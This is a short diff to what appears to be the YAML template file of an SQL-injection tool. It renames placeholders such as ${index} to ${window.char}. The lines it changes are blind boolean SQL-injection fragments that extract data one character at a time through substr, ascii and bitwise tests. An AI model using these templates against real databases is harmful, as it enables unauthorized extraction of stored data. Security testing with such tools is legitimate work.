@@ -90,7 +90,7 @@ resource:
     field: |
      trim(
          coalesce(
-             ${field}::varchar,
+             ${field.value}::varchar,
              ''
          )
      )
@@ -107,7 +107,7 @@ strategy:
        || NULLIF(
            substr(
                (${injection}),
-               ${index},
+               ${window.char},
                65536
            ),
            '${trail_sql}'
@@ -152,12 +152,12 @@ strategy:
         ascii(
             substr(
                 (${injection}),
-                ${index},
+                ${window.char},
                 1
             )
         ) %26 ${bit}
     )
-   length: char_length((${injection})) > ${index}
+   length: char_length((${injection})) > ${window.char}
   modeAnd: and
   modeOr: or
   blind: ${boolean.mode} ${test}
